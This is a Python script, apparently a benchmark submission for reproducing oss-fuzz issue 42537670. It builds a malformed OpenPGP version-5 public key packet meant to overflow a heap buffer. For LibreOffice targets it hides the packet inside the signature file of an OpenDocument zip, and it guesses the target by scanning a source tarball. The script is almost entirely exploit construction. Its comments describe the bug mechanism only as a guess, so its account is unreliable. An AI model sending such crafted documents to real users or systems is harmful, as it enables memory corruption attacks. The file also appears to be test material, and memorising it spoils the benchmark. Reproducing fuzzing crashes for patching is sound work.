import io
import zipfile
import base64
import tarfile
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        The vulnerability corresponds to oss-fuzz:42537670, which is likely an issue in
        LibreOffice's OpenPGP handling (xmlsecurity) where fingerprint generation fails
        due to version mismatch (e.g., V5 key) or malformed packet but the error is only
        logged, and execution proceeds to write out-of-bounds.
        """
        
        # Detect if target is LibreOffice or a raw OpenPGP library (like RNP)
        is_libreoffice = True
        try:
            lower_path = src_path.lower()
            if 'rnp' in lower_path and 'libreoffice' not in lower_path:
                is_libreoffice = False
            elif 'libreoffice' in lower_path:
                is_libreoffice = True
            else:
                # Inspect tarball contents to be sure
                with tarfile.open(src_path, 'r') as tar:
                    count = 0
                    for member in tar:
                        name = member.name.lower()
                        if 'libreoffice' in name or 'instdir' in name or 'vcl/' in name:
                            is_libreoffice = True
                            break
                        if ('rnp' in name or 'librnp' in name) and 'libreoffice' not in name:
                            is_libreoffice = False
                            break
                        count += 1
                        if count > 500: # limit checks
                            break
        except Exception:
            # Default to LibreOffice as the ground truth size (37KB) suggests a document format
            pass

        # Construct Payload: OpenPGP Public Key Packet
        # We use Version 5 (RFC draft / newer standard) which uses SHA-256 (32 bytes) for fingerprint.
        # If the vulnerable code expects Version 4 (SHA-1, 20 bytes) and allocates 20 bytes,
        # but parses Version 5 and writes 32 bytes, a heap buffer overflow occurs.
        # Alternatively, if the version check fails (logs error) but returns a partial object,
        # subsequent use might overflow.

        body = bytearray()
        body.append(5) # Version 5
        body.extend(b'\x62\x62\x62\x62') # Creation Time
        body.append(1) # Algo: RSA
        
        # MPI n (Modulus) - 1024 bits
        n_len = 1024
        body.extend(n_len.to_bytes(2, 'big'))
        body.extend(b'A' * 128)
        
        # MPI e (Exponent) - 17 bits (65537)
        e_len = 17
        body.extend(e_len.to_bytes(2, 'big'))
        body.extend(b'\x01\x00\x01')
        
        # Packet Header: New Format, Tag 6 (Public Key)
        packet = bytearray()
        packet.append(0xC0 | 6) # Tag 6
        
        l = len(body)
        if l < 192:
            packet.append(l)
        elif l < 8384:
            packet.append(((l - 192) >> 8) + 192)
            packet.append((l - 192) & 0xFF)
        else:
            packet.append(0xFF)
            packet.extend(l.to_bytes(4, 'big'))
            
        packet.extend(body)
        
        if not is_libreoffice:
            return bytes(packet)

        # Wrap in ODF (OpenDocument Format) ZIP for LibreOffice
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as z:
            # mimetype must be stored (uncompressed) and first
            z.writestr('mimetype', 'application/vnd.oasis.opendocument.text', compress_type=zipfile.ZIP_STORED)
            
            manifest_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">\n'
                ' <manifest:file-entry manifest:full-path="/" manifest:version="1.2" manifest:media-type="application/vnd.oasis.opendocument.text"/>\n'
                ' <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>\n'
                ' <manifest:file-entry manifest:full-path="META-INF/documentsignatures.xml" manifest:media-type="text/xml"/>\n'
                '</manifest:manifest>'
            )
            z.writestr('META-INF/manifest.xml', manifest_xml)
            
            content_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
                'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2">\n'
                ' <office:body>\n'
                '  <office:text>\n'
                '   <text:p>PoC</text:p>\n'
                '  </office:text>\n'
                ' </office:body>\n'
                '</office:document-content>'
            )
            z.writestr('content.xml', content_xml)
            
            # Embed the malicious PGP packet in the signature file
            pgp_b64 = base64.b64encode(packet).decode('ascii')
            signatures_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<document-signatures xmlns="urn:oasis:names:tc:opendocument:xmlns:digitalsignature:1.0">\n'
                '  <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">\n'
                '    <KeyInfo>\n'
                '      <PgpData>\n'
                f'        <PgpKeyPacket>{pgp_b64}</PgpKeyPacket>\n'
                '      </PgpData>\n'
                '    </KeyInfo>\n'
                '  </Signature>\n'
                '</document-signatures>'
            )
            z.writestr('META-INF/documentsignatures.xml', signatures_xml)
            
        return bio.getvalue()